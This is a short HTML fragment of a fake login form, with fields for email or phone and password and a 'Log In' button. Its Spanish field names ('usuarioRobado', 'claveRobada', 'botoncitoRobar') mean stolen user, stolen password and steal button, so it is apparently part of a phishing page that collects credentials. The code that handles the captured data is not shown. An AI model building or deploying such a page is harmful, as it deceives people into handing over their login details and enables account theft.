               ...
               <div class="card">
                   <form method="post">
                       <div class="input-container">
                           <input type="text" name="usuarioRobado"placeholder="Email address or phone number">
                       </div>
                       <div class="input-container">
                            <input type="password" name="claveRobada"placeholder="Password">
                        </div>
                        <div class="login-btn-container">
                            <input type="submit" name="botoncitoRobar" value="Log In" class="login-btn">
                        </div>
                   </form>
